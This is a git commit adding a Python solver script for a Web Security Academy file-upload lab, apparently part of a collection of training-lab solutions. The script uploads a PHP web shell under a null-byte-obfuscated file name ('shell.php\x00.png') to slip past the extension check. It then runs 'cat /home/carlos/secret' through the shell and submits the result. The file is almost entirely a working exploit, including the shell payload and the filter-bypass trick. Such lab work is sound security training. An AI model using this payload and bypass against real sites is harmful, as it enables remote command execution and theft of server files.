c14982a005cb5da570eade5c80ab3c3f3f0a68a9
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-02-06 21:44:57 -0800

    Web shell upload via obfuscated file extension

---
+++ web_security_academy/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension.py
@@ -0,0 +1,24 @@
+from web_security_academy.core.logger import logger
+from urllib.parse import urlencode
+
+
+def solve_lab(session):
+    session.login("wiener", "peter")
+
+    csrf = session.get_csrf_token("/my-account")
+    files = {"avatar": ("shell.php\x00.png", '<?php echo SYSTEM($_GET["cmd"])?>')}
+    data = {"user": "wiener", "csrf": csrf}
+    session.post_path("/my-account/avatar", files=files, data=data)
+    logger.info('Uploaded the following file to "/my-account/avatar":')
+    logger.info(files)
+
+    params = {"cmd": "cat /home/carlos/secret"}
+    resp = session.get_path(f"/files/avatars/shell.php", params=params)
+    logger.info(
+        f'Got the following response from visiting "/files/avatars/shell.php?{urlencode(params)}"'
+    )
+    logger.info(resp.text)
+
+    # For some reason, the secret file is printed twice in the HTTP response.
+    answer = resp.text[: (len(resp.text) // 2)]
+    session.submit_solution(answer)
